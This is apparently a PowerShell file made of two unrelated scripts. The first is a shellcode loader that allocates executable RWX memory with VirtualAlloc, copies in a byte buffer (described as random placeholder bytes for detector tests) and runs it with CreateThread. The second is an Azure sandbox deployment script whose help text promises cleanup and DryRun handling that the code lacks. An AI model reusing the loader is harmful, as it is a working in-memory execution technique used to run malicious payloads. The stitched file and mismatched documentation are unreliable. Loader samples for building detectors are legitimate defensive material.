
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x25, 0xc0, 0xc5, 0x61, 0xd1, 0xae, 0xce, 0x73, 0xfc, 0x14, 0x8d, 0xd3, 0x30, 0x0c, 0x5d, 0xf1,
    0x0d, 0x47, 0xbc, 0x38, 0x21, 0x37, 0x49, 0x7e, 0x1a, 0xa5, 0xda, 0x07, 0xad, 0x48, 0x92, 0x6a,
    0x3a, 0xd0, 0x95, 0xa4, 0x43, 0x17, 0xf1, 0xf2, 0xda, 0x8e, 0x70, 0x03, 0x68, 0x07, 0xe9, 0x82,
    0xc3, 0xb4, 0xb1, 0xbe, 0x63, 0xd0, 0x2b, 0x5d, 0x6a, 0xd0, 0x0a, 0x41, 0xdb, 0x61, 0xa0, 0x61,
    0x0b, 0x42, 0x73, 0xb0, 0x8b, 0xac, 0xa5, 0xde, 0x05, 0x20, 0xd6, 0x22, 0x8b, 0x0f, 0xda, 0xe2,
    0x16, 0xf3, 0x05, 0x21, 0xd8, 0x9f, 0x70, 0x53, 0x60, 0x56, 0x65, 0x0a, 0xed, 0xcb, 0x47, 0x15,
    0x6a, 0x4b, 0xa9, 0x91, 0x7d, 0x5b, 0x3f, 0x26, 0xaa, 0x0b, 0x11, 0xbb, 0x56, 0x29, 0x1c, 0x17,
    0x8b, 0x8c, 0xa4, 0xb1, 0xa4, 0x2b, 0x22, 0xfd, 0xbe, 0xc5, 0x44, 0x9a, 0xae, 0x6a, 0x69, 0x4d,
    0xeb, 0xa5, 0x09, 0xbf, 0x1d, 0xab, 0xab, 0xa5, 0x06, 0x67, 0x29, 0x89, 0x94, 0x34, 0xcf, 0xe1,
    0x1f, 0x0f, 0x72, 0x5c, 0xdf, 0x86, 0xbc, 0x27, 0xfa, 0x97, 0x8f, 0xe8, 0xa9, 0xb1, 0xe8, 0xd2,
    0x73, 0x57, 0x0b, 0x8b, 0x3a, 0xa6, 0x36, 0xbc, 0x80, 0x11, 0x44, 0x1c, 0x80, 0x23, 0x8d, 0xda,
    0x6c, 0x95, 0xb6, 0xa6, 0xe4, 0x0a, 0xc7, 0x48, 0x82, 0x2d, 0x09, 0xec, 0xce, 0x76, 0xd3, 0x16,
    0x43, 0x9c, 0x13, 0x59, 0x96, 0x7c, 0x31, 0x50, 0x55, 0xbd, 0x21, 0xdc, 0xfa, 0x6d, 0xea, 0x7e,
    0xb9, 0x67, 0x2c, 0xf0, 0x0d, 0x5b, 0x1a, 0xc1, 0x88, 0xe0, 0xcd, 0xf7, 0xa9, 0xaa, 0x41, 0x70,
    0xd3, 0x57, 0x19, 0x4a, 0x6f, 0x0c, 0x8e, 0x4f, 0xa9, 0x0a, 0xbf, 0xa8, 0xe8, 0xff, 0xc4, 0x6e,
    0x8f, 0x38, 0x49, 0xe3, 0x3d, 0xe8, 0x90, 0x2a, 0x54, 0xe3, 0xf5, 0xb8, 0xbc, 0xef, 0xc3, 0xaf,
    0xa8, 0xd2, 0xf2, 0x7d, 0x53, 0xa8, 0x24, 0x34, 0x6c, 0x19, 0x30, 0x06, 0x18, 0x40, 0xd8, 0x48,
    0x7c, 0x84, 0x7c, 0x6b, 0xb5, 0x38, 0x5d, 0xbc, 0xda, 0x81, 0x02, 0xd2, 0xf9, 0x87, 0x64, 0xcd,
    0xf4, 0xee, 0x90, 0x69, 0xb2, 0x49, 0x18, 0x0a
)

$BufferAddress = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 551)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.DESCRIPTION
    Runs a template validation first, then creates the resource group, the
    storage account and the test virtual machine before cleaning the sandbox up.
    The cleanup step honours the DryRun switch so the resources can be inspected
    after a failed deployment.
.EXAMPLE
    .\Invoke-AzSandbox.ps1 -ResourceGroup rg-portal-demo-24
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = 'rg-portal-demo-24',

    [ValidateSet('westeurope', 'eastus', 'northeurope', "uksouth")]
    [string]$Location = "westeurope",
    [string]$TemplateFile = 'C:\Scripts\templates\portal-demo.json',
    [string]$ParameterFile = 'C:\Scripts\templates\portal-demo.parameters.json',
    [string]$SubscriptionId = '413c5a6a-35f9-c52a-e7e9-594e8dea986e',

    [string]$StorageAccount = "stdemo1167",
    [string]$VmName = 'vm-portal-demo-24',

    [string]$OutputPath = "C:\Logs\deploy-demo-2024-12-20.json",

    [switch]$DryRun
)

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw "The Az.Resources module is not installed."
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployParams = @{
    ResourceGroupName     = $ResourceGroup
    TemplateFile          = $TemplateFile
    TemplateParameterFile = $ParameterFile
    Name                  = $DeploymentName
}
$deployment = New-AzResourceGroupDeployment @deployParams -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
